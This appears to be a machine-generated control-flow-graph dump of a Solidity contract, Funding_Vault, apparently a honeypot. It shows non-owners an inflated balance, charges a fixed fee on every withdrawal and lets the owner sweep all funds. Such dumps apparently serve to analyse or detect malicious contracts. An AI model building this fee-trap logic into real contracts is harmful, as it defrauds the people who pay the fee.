Contract: Funding_Vault
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: owner = msg.sender

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: interactionCount = 0

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: lastUpdate = block.timestamp

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: getVaultBalance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: msg.sender == owner

  ID: 2
  Type: NodeType.RETURN
  Expression: address(this).balance

  ID: 3
  Type: NodeType.ENDIF
  Expression: 

  ID: 4
  Type: NodeType.VARIABLE
  Expression: timeElapsed = block.timestamp - lastUpdate

  ID: 5
  Type: NodeType.VARIABLE
  Expression: calculatedBalance = (address(this).balance + (timeElapsed * 10000000000000000)) + (interactionCount * 30000000000000000)

  ID: 6
  Type: NodeType.RETURN
  Expression: calculatedBalance

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: withdraw
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: interactionCount ++

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: lastUpdate = block.timestamp

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(msg.value == 30000000000000000,Insufficient fee)

  ID: 4
  Type: NodeType.VARIABLE
  Expression: vaultBalance = getVaultBalance()

  ID: 5
  Type: NodeType.IF
  Expression: amount >= vaultBalance

  ID: 6
  Type: NodeType.VARIABLE
  Expression: 

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: (success,None) = msg.sender.call{value: address(this).balance}()

  ID: 8
  Type: NodeType.IF
  Expression: success

  ID: 9
  Type: NodeType.RETURN
  Expression: 

  ID: 10
  Type: NodeType.ENDIF
  Expression: 

  ID: 11
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  5 -> 11
  6 -> 7
  7 -> 8
  8 -> 9
  8 -> 10
  10 -> 11

Function: collectEarnings
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(msg.sender == owner,Unauthorized)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: address(owner).transfer(address(this).balance)

Edges:
  0 -> 1
  1 -> 2

Function: receive
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

Edges:


